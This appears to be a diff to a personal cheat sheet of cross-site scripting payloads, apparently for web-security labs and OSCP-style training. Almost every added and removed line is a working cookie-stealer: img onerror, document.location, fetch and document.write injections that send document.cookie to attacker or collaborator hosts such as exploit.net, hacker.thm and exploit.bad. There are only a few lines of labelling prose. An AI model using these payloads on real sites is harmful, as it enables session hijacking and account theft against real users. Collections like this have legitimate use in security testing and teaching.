@@ -64,7 +64,11 @@ document.location='https://Collaborator.com/?cookiestealer='+document.cookie;
 ```  
 
 ```html
-&'><img src=x onerror=this.src=/exploit-0a6b000b033762e6c0fa121d01fc0020.exploit-server.net/exploit?'+document.cookie;>
+&'><img src=x onerror=this.src="https://exploit-0a6b000b033762e6c0fa121d01fc0020.exploit-server.net/?ex="+document.cookie>
+```  
+
+```Javascript
+<img src=x onerror=this.src=https://exploit.net/?'+document.cookie;>
 ```  
 
 >***Document.location*** returns a Location object, which contains information about the URL of the document and provides methods for changing that URL and loading another URL.  
@@ -77,13 +81,12 @@ document.location='https://burp-collab.x.com/cookiestealer.php?c='+document.cook
 document.location='https://BurpCollaBoRaTor.oastify.com/?FreeCookies='+document.cookie;
 ```
 
-```Javascript
-/?evil='/><script>document.write('<img src="https://exploit.com/steal.MY?cookie=' document.cookie '" />')</script> 
-```
+>Document.write  
 
 ```Javascript
-<img src=x onerror=this.src=//exploit.net/?'+document.cookie;>
-```
+/?evil='/><script>document.write('<img src="https://exploit.com/steal.MY?cookie=' document.cookie '" />')</script> 
+```  
+
 
 ```Javascript
 <script>
@@ -126,9 +129,13 @@ x"); var fuzzer=new Image;fuzzer.src="https://COLLABORATOR.com/?"+document.cooki
 <script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>  
 ```
 
+>OSCP Offsec PWK hand book cookie stealer example  
+
 ```Javascript
 <script>new Image().src="http://Collaborator.COM/cool.jpg?output="+document.cookie;</script>
 ```
+
+>Alt Cookie Stealer  
 
 ```Javascript
 ?productId=1&storeId="></select><img src=x onerror=this.src='http://exploit.bad/?'+document.cookie;>
